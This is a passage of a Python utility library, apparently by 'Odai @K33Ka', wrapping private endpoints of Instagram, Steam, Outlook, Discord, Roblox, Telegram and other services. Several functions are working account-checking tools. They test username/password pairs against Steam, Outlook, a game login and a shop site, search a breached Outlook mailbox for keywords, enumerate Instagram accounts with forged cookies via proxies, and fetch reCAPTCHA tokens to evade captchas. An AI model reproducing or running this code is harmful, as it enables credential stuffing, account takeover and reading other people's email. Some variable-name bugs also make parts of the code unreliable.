                identity = js["data"]["fx_identity_management"]["identities_and_central_identities"]["linked_identities_to_pci"][0]
                username = identity.get("username")
                account_type = identity.get("detailed_identity_type")
                profile_picture = identity.get("profile_picture_info", {}).get("profile_picture_url")
                nodes = js["data"]["fxcal_settings"]["node"]["personal_info_section"]["nodes"]
                email = None
                birthday = None
                for node in nodes:
                    if node.get("__typename") == "XFBFXSettingsContactPoint": email = node.get("navigation_row_subtitle")
                    elif node.get("__typename") == "XFBFXSettingsBirthday": birthday = node.get("navigation_row_subtitle")
                return {"status": "success","username": username,"account_type": account_type,"profile_picture": profile_picture,"email": email,"birthday": birthday,"Dev": Dev}
            except Exception as e:
                return {"status": "parse error","error": str(e),"Dev": Dev}
        except Exception as e:return {"status": "error","error": str(e),"Dev": Dev}
    @staticmethod
    def search(proxies=None):
        import requests,random,secrets
        from faker import Faker
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry

        Dev = "Odai @K33Ka"

        try:
            def k():
                s=requests.Session()
                r=Retry(total=2,backoff_factor=0.1,status_forcelist=[500,502,503,504])
                a=HTTPAdapter(pool_connections=100,pool_maxsize=100,max_retries=r)
                s.mount('https://',a);s.mount('http://',a)
                return s

            def l():
                y=random.choice([2012,2013])
                z={2012:(17750001,279760000),2013:(279760001,900990000)}
                return str(random.randint(*z[y]))

            s=k()
            f=Faker()
            results=[]

            while len(results) < 5:
                try:
                    p=l()
                    q=secrets.token_hex(32)
                    r=secrets.token_hex(27)
                    t=secrets.token_hex(36)
                    u=secrets.token_hex(24)
                    v=f.user_agent()
                    w=''.join(random.choice('936619743392459')for _ in range(15))

                    cookies={'csrftoken':q,'ps_l':'0','ps_n':'0','ig_did':t,'ig_nrcb':'1','dpr':'2','mid':r,'datr':u}
                    headers={'user-agent':v,'viewport-width':'891','x-asbd-id':'129477','x-csrftoken':q,'x-fb-friendly-name':'PolarisProfilePageContentQuery','x-fb-lsd':'AVoRhvRPoRs','x-ig-app-id':w}
                    data={'lsd':'AVoRhvRPoRs','variables':f'{{"id":"{p}","relay_header":false,"render_surface":"PROFILE"}}','server_timestamps':'true','doc_id':'7381344031985950'}

                    res=s.post('https://www.instagram.com/api/graphql',cookies=cookies,headers=headers,data=data,timeout=3,proxies = proxy.build(proxies))
                    js=res.json()

                    if 'data' in js and js['data'] and 'user' in js['data']:
                        username=js['data']['user'].get("username")
                        if username and username not in results:
                            results.append(username)

                except:
                    continue

            return {"status": "success","users": results,"Dev": Dev}

        except Exception as e:
            return {"status": "error","error": str(e),"Dev": Dev}
    @staticmethod
    def info(username, proxies=None):
        import requests
        Dev = "Odai @K33Ka"
        if not username:return {"status": "invalid input","username": username,"Dev": Dev}
        try:
            r = requests.get(f'https://peekviewer.com/api/ig/{username}', proxies = proxy.build(proxies))
            if r.status_code == 200:
                try:
                    response = r.json()
                    if response.get("status") == "success":
                        data = response.get("data", {})
                        return {
                            "status": "success",
                            "id": data.get("id"),
                            "full_name": data.get("fullName"),
                            "username": data.get("username"),
                            "posts": data.get("postsCount"),
                            "followers": data.get("followersCount"),
                            "following": data.get("followingCount"),
                            "private": data.get("isPrivate"),
                            "profile_pic": data.get("profilePicUrl"),
                            "Dev": Dev
                        }
                    else:
                        return {
                            "status": "failed",
                            "username": username,
                            "Dev": Dev
                        }
                except Exception as e:
                    return {
                        "status": "json error",
                        "error": str(e),
                        "username": username,
                        "Dev": Dev
                    }
            else:
                return {
                    "status": "http error",
                    "code": r.status_code,
                    "username": username,
                    "Dev": Dev
                }
        except Exception as e:
            return {
                "status": "request error",
                "error": str(e),
                "username": username,
                "Dev": Dev
            }
    @staticmethod
    def checkusername(username,proxies=None):
        import requests,re,random
        Dev = "Odai @K33Ka"
        try:
            url = "https://www.instagram.com/"
            response = requests.get(url, proxies = proxy.build(proxies))
            cookies_raw = response.headers.get('Set-Cookie', '')
            match = re.search(r"csrftoken=([^;]+)", cookies_raw)
            csrftoken = match.group(1) if match else None
            if not csrftoken:
                return {"status": "csrf error","Dev": Dev}
            cookies = {'csrftoken': csrftoken,'dpr': '2.625','mid': 'Zv58iAABAAFLa6BSzAgqXKb9GvK7','datr': 'iHz-Zn21Ji73yEkxXS5aDuzU','ig_did': '6A0F5B62-9C1F-4682-859D-61D83C2F0940','ig_nrcb': '1','wd': '412x414'}
            headers = {'authority': 'www.instagram.com','accept': '*/*','accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/accounts/signup/username/','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '"SM-N985F"','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"13.0.0"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36','x-asbd-id': '129477','x-csrftoken': csrftoken,'x-ig-app-id': '1217981644879628','x-ig-www-claim': '0','x-instagram-ajax': '1017024069','x-requested-with': 'XMLHttpRequest','x-web-device-id': '6A0F5B62-9C1F-4682-859D-61D83C2F0940'}
            data = {'username': username}
            r = requests.post('https://www.instagram.com/api/v1/users/check_username/', cookies=cookies, headers=headers, data=data, proxies = proxy.build(proxies))
            text = r.text
            if 'available":true' in text:
                return {"status": "available","username": username,"Dev": Dev}
            elif 'available":false' in text:
                return {"status": "taken","username": username,"Dev": Dev}
            else:
                return {"status": "unknown","username": username,"Dev": Dev}
        except Exception as e:
            return {"status": "error","error": str(e),"Dev": Dev}
    @staticmethod
    def checkemail(email, proxies=None):
        Dev="Odai @K33Ka"
        if not email:return {"status":"invalid input","email":email,"Dev":Dev}
        try:
            rnd=str(random.randint(150,999));av=['23/6.0','24/7.0','25/7.1.1','26/8.0','27/8.1','28/9.0'];mf=['SAMSUNG','HUAWEI','LGE/lge','HTC','ASUS','ZTE','ONEPLUS','XIAOMI','OPPO','VIVO','SONY','REALME']
            ua=f'Instagram 311.0.0.32.118 Android ({random.choice(av)}; {random.randint(100,1300)}dpi; {random.randint(200,2000)}x{random.randint(200,2000)}; {random.choice(mf)}; SM-T{rnd}; SM-T{rnd}; qcom; en_US; 545986{random.randint(111,999)})'
            s=requests.Session();s.get("https://www.instagram.com/accounts/signup/email/",proxies = proxy.build(proxies))
            csrf=s.cookies.get_dict().get("csrftoken")
            h={"user-agent":ua,"x-csrftoken":csrf,"referer":"https://www.instagram.com/accounts/signup/email/"}
            r=s.post("https://www.instagram.com/api/v1/web/accounts/check_email/",headers=h,data={"email":email},proxies = proxy.build(proxies)).text
            if 'email_is_taken' in r:return {"status":"taken","email":email,"Dev":Dev}
            elif 'valid' in r or 'available' in r:return {"status":"available","email":email,"Dev":Dev}
            else:return {"status":"unknown","email":email,"Dev":Dev}
        except requests.exceptions.ConnectionError:return {"status":"connection error","email":email,"Dev":Dev}
        except Exception as e:return {"status":"error","error":str(e),"email":email,"Dev":Dev}
class steam:
    def login(username,password,proxy=None):
        USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";PROXY=proxy
        def rsa_encrypt_password(password,mod_hex,exp_hex):
            try:
                modulus=int(mod_hex,16);exponent=int(exp_hex,16)
                key=RSA.construct((modulus,exponent))
                cipher=PKCS1_v1_5.new(key)
                encrypted=cipher.encrypt(password.encode('utf-8'))
                return urllib.parse.quote_plus(b64encode(encrypted).decode('utf-8'))
            except:return ""
        session=requests.Session()
        if PROXY:session.proxies.update(PROXY)
        session.headers.update({"User-Agent":USER_AGENT})
        clean_username=re.sub(r"@.*","",username)
        try:
            rsa_payload={"donotcache":str(int(time.time()*1000)),"username":clean_username}
            rsa_res=session.post(
                "https://steamcommunity.com/login/getrsakey/",
                data=rsa_payload,
                headers={
                    "Origin":"https://steamcommunity.com",
                    "X-Requested-With":"XMLHttpRequest",
                    "Accept":"*/*",
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"
                }
            )
            rsa_data=rsa_res.json()
            if not rsa_data.get("success",False):
                rsa_data["Dev"]="Odai @K33Ka"
                return "BAN",rsa_data
            mod=rsa_data.get("publickey_mod")
            exp=rsa_data.get("publickey_exp")
            timestamp=rsa_data.get("timestamp")
        except:return "FAIL",{}

        encrypted_pass=rsa_encrypt_password(password,mod,exp)
        if not encrypted_pass:return "FAIL",{}
        try:
            login_payload={
                "donotcache":str(int(time.time()*1000)),
                "password":encrypted_pass,
                "username":clean_username,
                "twofactorcode":"",
                "emailauth":"",
                "loginfriendlyname":"",
                "captchagid":"-1",
                "captcha_text":"",
                "emailsteamid":"",
                "rsatimestamp":timestamp,
                "remember_login":"false",
                "oauth_client_id":"3638BFB1"
            }
            login_res=session.post(
                "https://steamcommunity.com/login/dologin/",
                data=login_payload,
                headers={
                    "Origin":"https://steamcommunity.com",
                    "X-Requested-With":"XMLHttpRequest",
                    "Referer":"https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client",
                    "Accept":"*/*",
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"
                }
            )
            login_data=login_res.json()
            login_data["Dev"]="Odai @K33Ka"
            if login_data.get("success",False):return "SUCCESS",session
            elif login_data.get("captcha_needed")==True:return "BAN",login_data
            elif login_data.get("requires_twofactor")==True or login_data.get("emailauth_needed")==True:
                return login_data
            elif "incorrect" in login_data.get("message","").lower():return "FAIL",login_data
            else:return "FAIL",login_data
        except:return "FAIL",{}
    def info(session):
        try:
            acc_res=session.get(
                "https://store.steampowered.com/account/",
                headers={
                    "Referer":"https://steamcommunity.com/",
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
                }
            )
            captured_data={}
            email_match=re.search(r'>Email address:</span> <span class="account_data_field">(.*?)</span>',acc_res.text)
            if email_match:captured_data["Email"]=email_match.group(1).strip()
            country_match=re.search(r'class="account_data_field">(.*?)</span>',acc_res.text)
            if country_match:captured_data["Country"]=country_match.group(1).strip()
            balance_match=re.search(r'<div class="accountData price">(.*?)</div>',acc_res.text)
            if balance_match:captured_data["Balance"]=balance_match.group(1).strip()
            level_match=re.search(r'class="friendPlayerLevelNum">(.*?)</span>',acc_res.text)
            if level_match:captured_data["Level"]=level_match.group(1).strip()
            years_match=re.search(r'steamyears_(\d+)',acc_res.text)
            if years_match:captured_data["Years Badge"]=years_match.group(1)
            return captured_data
        except:return {}
class roblox:
    def usernamecheck(u):
        import httpx,time
        def check(x):
            try:
                r=httpx.get(f"https://auth.roblox.com/v1/usernames/validate?birthday=2005-03-04T00:00:00.000Z&context=Signup&username={x}",timeout=5)
                if r.status_code==429:
                    time.sleep(3)
                    return check(x)
                data=r.json()
                if data.get("code")==0:return True
                return False
            except:return False
        res=check(u)
        return {"available":res,"Dev":"Odai @K33Ka"}
def inviteinfo(invite):
    DEV = "Odai @K33Ka"
    if "discord.gg/" in invite:invite_code = invite.split("discord.gg/")[-1].split("/")[0]
    elif "discord.com/invite/" in invite:invite_code = invite.split("discord.com/invite/")[-1].split("/")[0]
    else:invite_code = invite.strip()
    url = f"https://discord.com/api/v9/invites/{invite_code}"
    params = {
        "with_counts": "true",
        "with_expiration": "true"
    }
    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    try:
        response = requests.get(url, params=params, headers=headers)
        data = response.json()
        guild = data.get('guild', {})
        inviter = data.get('inviter', {})
        channel = data.get('channel', {})
        def format_time(t):
            if not t:return None
            try:
                dt = datetime.fromisoformat(t.replace("Z", "+00:00"))
                return dt.strftime("%Y-%m-%d %H:%M:%S")
            except:return t
        def asset_url(kind):
            if guild.get('id') and guild.get(kind):return f"https://cdn.discordapp.com/{kind}s/{guild['id']}/{guild[kind]}.png"
        result = {
            "raw": data,

            "server": {
                "name": guild.get('name'),
                "id": guild.get('id'),
                "description": guild.get('description'),
                "members": data.get('approximate_member_count'),
                "online": data.get('approximate_presence_count'),
                "boost_level": guild.get('premium_tier'),
                "boosts": guild.get('premium_subscription_count'),
                "verification_level": guild.get('verification_level'),
                "nsfw": guild.get('nsfw'),
                "features": guild.get('features', [])
            },

            "inviter": {
                "username": inviter.get('username'),
                "display_name": inviter.get('global_name'),
                "id": inviter.get('id')
            },

            "invite": {
                "code": data.get('code'),
                "channel": channel.get('name'),
                "expires": format_time(data.get('expires_at')),
                "temporary": data.get('flags') == 2
            },

            "assets": {
                "icon": asset_url("icon"),
                "banner": asset_url("banner"),
                "splash": asset_url("splash")
            },
            "Dev": DEV,
        }
        return result
    except Exception as e:return {
            "dev": DEV,
            "error": str(e)
        }
class bloodstrike:
    def login(username,password):
        import requests,time,random
        url="https://sdk-os-me.mpsdk.easebar.com/api/users/login/v2/nt_passport/auth"
        tid=str(int(time.time()*1000));rid=str(random.randint(100000000,999999999))
        params={'game_id':"10001",'cp':"a",'debug_mode':"0",'cv':"3.16.1",'gv':"122",'jf_game_id':"g83naxx1me",'time_zone':"Asia/Amman",'time_offset':"10800",'lang':"en-US",'app_channel':"g83naxx1me@google_play",'ci':"74a1e1a5ea663e50",'ext_ci':"242d2a55118b4acb6de5a513fe4efdfe233d6fd90450edce314423f4bdc509f4",'ci_code':"0",'mcount_app_key':"2uTViL8JBBDJQwIwNfgGUTVA0vmbQFgn",'mcount_transaction_id':f"74a1e1a5ea663e50_{tid}_{rid}",'transid':f"74a1e1a5ea663e50_{tid}_{random.randint(100000000,999999999)}"}
        data={'device_id':"1781575885",'account_type':"25",'account':username,'password':password,'scene':"login_bind"}
        headers={'User-Agent':"com.netease.newspikeme/122 NeteaseMobileGame/a3.16.1 (2201117PG;33)",'Connection':"Keep-Alive",'Accept-Encoding':"gzip",'Accept-Charset':"UTF-8",'Accept-Language':"en-us"}
        try:
            r=requests.post(url,params=params,data=data,headers=headers);t=r.text
            if 'login_token' in t:return {"status":"success","Dev":"Odai @K33Ka"}
            elif 'Account does not exist' in t:return {"status":"not_found","Dev":"Odai @K33Ka"}
            elif '429 Too Many Requests' in t:return {"status":"retry","Dev":"Odai @K33Ka"}
            elif 'Incorrect account or password.' in t:return {"status":"bad password","Dev":"Odai @K33Ka"}
            else:return {"status":"unknown","Dev":"Odai @K33Ka"}
        except:return {"status":"error","Dev":"Odai @K33Ka"}
class pipinfo:
    def info(package):
        DEV = "Odai - @K33Ka"
        try:
            package = package.strip()
            url = f"https://pypistats.org/api/packages/{package}/overall"
            r = requests.get(url)
            if r.status_code != 200:return {"Dev": DEV,"error": "Package not found or no stats available"}
            json_data = r.json()
            data = json_data.get("data", [])
            total_downloads = sum(entry.get("downloads", 0) for entry in data)
            return {"package": package,"total_downloads": total_downloads,"Dev": DEV}
        except Exception as e:return {"error": str(e),"Dev": DEV,}
class pinterest:
    def info(username, download=False):
        DEV = "Odai - @K33Ka"
        try:
            username = username.strip()
            all_pins = []
            bookmark = ""
            data = None
            while True:
                url = f"https://api.pinterest.com/v3/pidgets/users/{username}/pins/"
                params = {}
                if bookmark:params["bookmarks"] = bookmark
                r = requests.get(url, params=params)
                if r.status_code != 200:return {"Dev": DEV, "error": "Account not found or request failed"}
                data = r.json()
                pins = data.get("data", {}).get("pins", [])
                all_pins.extend(pins)
                bookmark = data.get("data", {}).get("bookmarks", [])
                if not bookmark or bookmark == ["-end-"]:break
                bookmark = bookmark[0]
            user = data.get("data", {}).get("user", {})
            pins_data = []
            for i, pin in enumerate(all_pins, start=1):
                desc = pin.get("description")
                is_video = pin.get("is_video", False)
                media_url = None
                media_type = "video" if is_video else "image"
                if is_video:
                    vlist = pin.get("videos", {}).get("video_list", {})
                    if vlist:media_url = list(vlist.values())[0].get("url")
                else:media_url = pin.get("images", {}).get("564x", {}).get("url")
                pins_data.append({
                    "index": i,
                    "type": media_type,
                    "description": desc,
                    "url": media_url
                })
            if download:
                folder = f"downloads_{username}"
                os.makedirs(folder, exist_ok=True)
                for i, pin in enumerate(pins_data):
                    try:
                        if pin["url"]:
                            r = requests.get(pin["url"])
                            ext = ".mp4" if pin["type"] == "video" else ".jpg"
                            with open(f"{folder}/{i}{ext}", "wb") as f:
                                f.write(r.content)
                    except:pass
            return {
                "user": {
                    "name": user.get("full_name"),
                    "id": user.get("id"),
                    "url": user.get("profile_url"),
                    "pins_count": user.get("pin_count"),
                    "followers": user.get("follower_count"),
                    "about": user.get("about")
                },

                "pins_count": len(all_pins),
                "pins": pins_data,
                "Dev": DEV,
            }
        except Exception as e:
            return {"error": str(e),"Dev": DEV,}
class captchaV2:
    def token(siteUrl="https://example.com/", siteKey=""):
        Dev = "Odai - @K33Kz"
        try:
            userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            site_html = requests.get(siteUrl).text
            try:
                renderUrl = re.findall(
                    r'<script[^>]+src="(https://www\.google\.com/recaptcha/[^"]+)"',
                    site_html
                )[0]
            except:
                renderUrl = 'https://www.google.com/recaptcha/enterprise.js'
            js = requests.get(renderUrl).text
            match = re.search(r"po\.src\s*=\s*'(https://[^']+)';", js)
            if match:
                v = match.group(1).split('/')[5]
                api = renderUrl.split('.js')[0]
                if 'api2' not in api and 'enterprise' not in api:
                    api += '2'
            else:
                parsed = urlparse(renderUrl)
                query_params = parse_qs(parsed.query)
                v = query_params.get('v', [None])[0]
                if v is None:
                    v = renderUrl.split('/')[5]
                api = renderUrl.split('.js')[0]
            domain = siteUrl.split('/')[2]
            co = base64.b64encode(
                f'https://{domain}:443'.encode()
            ).decode().replace('=', '.')
            headers = {
                "accept": "*/*",
                "origin": "https://www.google.com",
                "user-agent": userAgent,
                "referer": siteUrl
            }
            anchor_params = {
                'ar': '1',
                'k': siteKey,
                'co': co,
                'hl': 'en',
                'v': v,
                'size': 'invisible',
                'cb': 'abc123'
            }
            anchor = requests.get(
                f'{api}/anchor',
                params=anchor_params,
                headers=headers
            ).text
            recaptcha_token = anchor.split('recaptcha-token" value="')[1].split('"')[0]
            reload_headers = headers.copy()
            reload_headers['referer'] = f'{api}/anchor?ar=1&k={siteKey}&co={co}&hl=en&v={v}&size=invisible&cb=abc123'
            reload_data = {
                'v': v,
                'co': co,
                'reason': 'q',
                'size': 'invisible',
                'hl': 'en',
                'k': siteKey,
                'c': recaptcha_token,
                'chr': '',
                'vh': '',
                'bg': ''
            }
            reload = requests.post(
                f'{api}/reload?k={siteKey}',
                data=reload_data,
                headers=reload_headers
            ).text
            final_token = reload.split('"rresp","')[1].split('"')[0]
            return {
                "site": siteUrl,
                "siteKey": siteKey,
                "token": final_token,
                "v": v,
                "api": api,
                "Dev": DEV,
            }
        except Exception as e:
            return {"error": str(e),"Dev": DEV,}
class damkom:
    def login(username, password, proxy=None):
        Dev = "Odai - @K33Kz"
        try:
            proxies = None
            if proxy:proxies = proxy.build(proxy)
            res = requests.post(
                'https://kd1s.com/',
                cookies={
                    '_csrf': 'a5a5049a84889a874bdbf74877fa05daf4b0b77665a2169989a499bc4d8175bca%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22KE-j2ZxYybWv9MXIAwB0RHwFGTq5jdoJ%22%3B%7D'
                },
                headers={
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
                    'Referer': 'https://kd1s.com/'
                },
                data={
                    'LoginForm[username]': username,
                    'LoginForm[password]': password,
                    '_csrf': 'PRf9Frq-_BRAbe3TU2U1bLz8qFZS1Lp7sXb94RVlgqV2UtB8iOSETTkPuqVqKG0l_YvqZgCczT32IozUfwHt7w=='
                },
                proxies=proxies
            ).text
            if "اسم المستخدم أو كلمة المرور غير صحيحة" in res:
                return {
                    "status": "invalid",
                    'user': username,
                    'password': password,
                    "Dev": DEV,
                }
            elif "رصيدك الحالي" in res:
                try:coin = res.split("رصيدك الحالي")[0].split("<span>")[1].split("</span>")[0]
                except:coin = None
                return {
                    "status": "success",
                    "balance": coin,
                    "username": username,
                    "Dev": DEV,
                }
            else:
                return {
                    "status": "unknown",
                    "Dev": DEV,
                }
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "Dev": DEV,
            }
class Outlook:
    @staticmethod
    def login(email, password, keyword=None):
        result = {
            "status": False,
            "email": email,
            "password": password,
            "cid": "",
            "token": "",
            "profile": {
                "name": "",
                "country": "",
                "birth_date": ""
            },
            "keyword_result": {
                "keyword": keyword,
                "found": False,
                "count": 0
            },
            "Dev": "Odai @K33Ka"
        }
        
        try:
            headers_auth = {
                "User-Agent": str(user_agent.generate_user_agent()),
                "X-Requested-With": "com.microsoft.outlooklite",
            }
            
            params = {
                "client_info": "1",
                "haschrome": "1",
                "login_hint": email,
                "mkt": "en",
                "response_type": "code",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
            }
            
            url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            res_auth = requests.get(url_auth, headers=headers_auth, timeout=15)
            
            cok = res_auth.cookies.get_dict()
            host = res_auth.text.split('"urlPost":"')[1].split('",')[0]
            ppft = res_auth.text.split('name=\\"PPFT\\" id=\\"i0327\\" value=\\"')[1].split('\\"')[0]
            ad_url = res_auth.url.split('haschrome=1')[0]
            payload = {
                "i13": "1",
                "login": email,
                "loginfmt": email,
                "type": "11",
                "LoginOptions": "1",
                "passwd": password,
                "PPFT": ppft,
                "PPSX": "PassportR",
                "i19": "9960"
            }
            
            headers_login = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": str(user_agent.generate_user_agent()),
                "Referer": f"{ad_url}haschrome=1",
                "Cookie": f"MSPRequ={cok.get('MSPRequ')};uaid={cok.get('uaid')}; RefreshTokenSso={cok.get('RefreshTokenSso')}; MSPOK={cok.get('MSPOK')}; OParams={cok.get('OParams')};"
            }
            
            res_login = requests.post(host, data=payload, headers=headers_login, allow_redirects=False, timeout=15)
            login_cookies = res_login.cookies.get_dict()
            if not any(key in login_cookies for key in ["JSH", "JSHP", "ANON", "WLSSC"]):
                return result
            
            result["status"] = True
            auth_code = res_login.headers.get('Location', '').split('code=')[1].split('&')[0]
            cid = login_cookies.get('MSPCID', '').upper()
            result["cid"] = cid
            
            url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
            data = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": auth_code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            
            token_res = requests.post(url, data=data, timeout=15).json()
            token = token_res.get("access_token", "")
            result["token"] = token
            
            if not token:return result
            result["profile"] = Outlook._get_profile(token, cid)
            if keyword:
                result["keyword_result"] = Outlook._search_keyword(token, cid, keyword)
            
            return result
            
        except Exception:
            return result
    
    @staticmethod
    def _get_profile(token, cid):
        profile = {"name": "Unknown", "country": "Unknown", "birth_date": "Unknown"}
        
        try:
            headers_info = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
            response = requests.get(profile_url, headers=headers_info, timeout=10)
            
            if response.status_code != 200:
                return profile
           
            r = response.json()
            if 'names' in r and isinstance(r['names'], list) and len(r['names']) > 0:
                profile["name"] = r['names'][0].get('displayName', 'Unknown')
            elif 'displayName' in r:
                profile["name"] = r['displayName']
            elif 'userPrincipalName' in r:
                profile["name"] = r['userPrincipalName'].split('@')[0]
            if 'accounts' in r and isinstance(r['accounts'], list) and len(r['accounts']) > 0:
                profile["country"] = r['accounts'][0].get('location', 'Unknown')
            elif 'country' in r:
                profile["country"] = r['country']
                
            day = r.get('birthDay', '')
            month = r.get('birthMonth', '')
            year = r.get('birthYear', '')
            
            if day and month and year:
                if len(str(day)) == 1:
                    day = f"0{day}"
                if len(str(month)) == 1:
                    month = f"0{month}"
                profile["birth_date"] = f"{day}/{month}/{year}"
            elif year:
                profile["birth_date"] = str(year)
            
        except Exception:
            pass
        
        return profile
    
    @staticmethod
    def _search_keyword(token, cid, keyword):
        result = {
            "keyword": keyword,
            "found": False,
            "count": 0
        }
        
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            headers_search = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "Egypt Standard Time",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                            {"Term": {"DistinguishedFolderName": "SentItems"}},
                            {"Term": {"DistinguishedFolderName": "Inbox"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": keyword},
                    "RefiningQueries": None,
                    "Size": 50,
                    "Sort": [
                        {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                        {"Field": "Time", "SortDirection": "Desc"}
                    ],
                    "EnableTopResults": True,
                    "TopResultsCount": 5
                }],
                "LogicalId": str(uuid.uuid4())
            }
            
            response = requests.post(search_url, json=payload, headers=headers_search, timeout=15)
            
            if response.status_code != 200:return result
            result_data = response.json()
            result_text = json.dumps(result_data).lower()
            count = result_text.count(keyword.lower())
            result["count"] = count
            result["found"] = count > 0
        except Exception:pass
        return result
class Telegram:
    @staticmethod
    def checkusername(username):
        result = {
            "status": False,
            "username": username,
            "state": "unknown",
            "Dev": "Odai @K33Ka"
        }
        try:
            session = requests.Session()
            r = session.get('https://fragment.com/', timeout=15)
            html = r.text
            hash_match = html.split('hash=')[1].split('"')[0] if 'hash=' in html else '4a701c9acc3b33fd8e' 
            response = session.post(
                'https://fragment.com/api',
                params={'hash': hash_match},
                headers={
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://fragment.com',
                    'referer': 'https://fragment.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest'
                },
                data={
                    'type': 'usernames',
                    'query': username,
                    'method': 'searchAuctions'
                },
                timeout=15
            )
            response_text = response.text
            result["status"] = True
            response_lower = response_text.lower()
            if 'available' in response_lower:result["state"] = "for sell"
            elif 'taken' in response_lower:result["state"] = "on telegram"
            elif 'unavailable' in response_lower:result["state"] = "available"
            elif 'free' in response_lower:result["state"] = "available"
            return result     
        except:return result
class weatherinfo:
    def info():
        DEV = "Odai - @K33Kz"
        try:
            def get_ip_info():
                try:
                    r = requests.get("https://ipinfo.io/json", timeout=6)
                    r.raise_for_status()
                    return r.json()
                except:
                    return {}

            def get_major_city_from_coords(lat, lon):
                try:
                    url = "https://nominatim.openstreetmap.org/reverse"
                    params = {"format": "jsonv2", "lat": lat, "lon": lon, "accept-language": "en"}
                    headers = {"User-Agent": "weather-script/1.0"}
                    r = requests.get(url, params=params, headers=headers, timeout=6)
                    r.raise_for_status()
                    data = r.json()
                    addr = data.get("address", {})
                    return addr.get("city") or addr.get("town") or addr.get("county") or addr.get("state") or data.get("display_name")
                except:
                    return None

            def get_weather_for_city(city):
                try:
                    url = f"https://wttr.in/{city}?format=j1"
                    r = requests.get(url, timeout=8)
                    r.raise_for_status()
                    return r.json()
                except:
                    return None

            ip_info = get_ip_info()
            fallback_city = ip_info.get("city")
            loc = ip_info.get("loc")

            major_city = None
            if loc:
                lat, lon = loc.split(",")
                major_city = get_major_city_from_coords(lat.strip(), lon.strip())

            if not major_city:
                major_city = fallback_city

            data = get_weather_for_city(major_city)

            if data and "weather" in data:
                today = data['weather'][0]
                forecast = []

                for hour in today.get('hourly', []):
                    time = hour.get('time', "0")
                    try:
                        t_int = int(time)
                        hour_24 = (t_int // 100) % 24
                        period = "AM" if hour_24 < 12 else "PM"
                        hour_12 = hour_24 % 12 or 12
                        hour_label = f"{hour_12:02d} {period}"
                    except:
                        hour_label = time

                    temp = hour.get('tempC', '?')
                    forecast.append({
                        "time": hour_label,
                        "tempC": temp
                    })

                return {
                    "city": major_city,
                    "forecast": forecast,
                    "Dev": DEV
                }

            else:
                return {
                    "error": "Failed to fetch weather",
                    "Dev": DEV
                }

        except Exception as e:
            return {
                "error": str(e),
                "Dev": DEV
            }
class file2link:
    @staticmethod
    def convert(file_path: str):
        start_time = time.time()
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                code = f.read()
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Cache-Control': 'max-age=0',
